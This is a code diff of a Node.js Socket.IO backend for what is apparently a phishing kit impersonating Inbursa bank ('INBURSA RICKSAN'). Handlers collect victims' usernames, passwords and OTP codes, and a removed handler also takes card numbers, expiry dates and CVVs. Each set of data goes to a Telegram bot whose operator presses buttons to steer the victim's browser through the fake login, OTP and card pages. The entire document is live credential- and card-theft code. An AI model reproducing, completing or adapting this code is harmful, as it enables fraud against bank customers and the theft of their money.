@@ -26,24 +26,34 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
-  // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, sessionId }) => {
+  // Formulario de errorlogo.html (Recibe usuario y contraseña)
+  socket.on('errorlogoForm', ({ usuario, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    // Enviar los datos recibidos a Telegram
+    const mensaje = `⚠️ Nuevo intento fallido detectado INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
-            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
+            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
+            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
             { text: '🟨 TC', callback_data: `tc_${sessionId}` }
           ]
         ]
       }
     };
 
+    // Enviar mensaje a Telegram
     bot.sendMessage(telegramChatId, mensaje, botones);
+  });
+
+  // Responder a la interacción de Telegram
+  socket.on('redirigir', ({ url, sessionId }) => {
+    const socketTarget = activeSockets.get(sessionId);
+    if (socketTarget) {
+      socketTarget.emit('redirigir', url);
+    }
   });
 
   // Código OTP (bienvenido.html)
@@ -77,46 +87,6 @@ io.on('connection', (socket) => {
           [
             { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
             { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
-          ]
-        ]
-      }
-    };
-
-    bot.sendMessage(telegramChatId, mensaje, botones);
-  });
-
-  // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, sessionId }) => {
-    activeSockets.set(sessionId, socket);
-
-    const mensaje = `⚠️ Nuevo intento fallido detectado INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}`;
-    const botones = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
-            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
-          ]
-        ]
-      }
-    };
-
-    bot.sendMessage(telegramChatId, mensaje, botones);
-  });
-
-  // Datos de tarjeta
-  socket.on('datosTarjeta', ({ tarjeta, vencimiento, cvv, sessionId }) => {
-    activeSockets.set(sessionId, socket);
-
-    const mensaje = `💳 Datos de Tarjeta Recibidos:\n\n🔢 Número: ${tarjeta}\n📅 Vencimiento: ${vencimiento}\n🔒 CVV: ${cvv}`;
-    const botones = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '❌ Error TC', callback_data: `errortc_${sessionId}` },
-            { text: '✅ Finalizar', callback_data: `finalizarTarjeta_${sessionId}` },
             { text: '🟨 TC', callback_data: `tc_${sessionId}` }
           ]
         ]
